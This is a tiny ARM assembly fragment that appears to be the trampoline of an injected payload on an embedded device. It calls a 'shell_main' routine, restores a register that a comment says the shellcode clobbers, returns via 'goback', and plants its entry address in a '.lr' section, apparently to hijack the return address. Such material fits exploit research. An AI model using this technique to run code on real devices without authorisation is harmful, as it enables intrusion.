shell:
    .commands: .asciz "1 2 3 4 5 6 7 8 9 10 "
go:
    bl shell_main
    // r4 gets overwritten by the shellcode
    // reload its values once it's done
    ldr r4, =0x20000000
    ldr r0, =goback+1
    bx r0
.section .lr
    .long go + 1
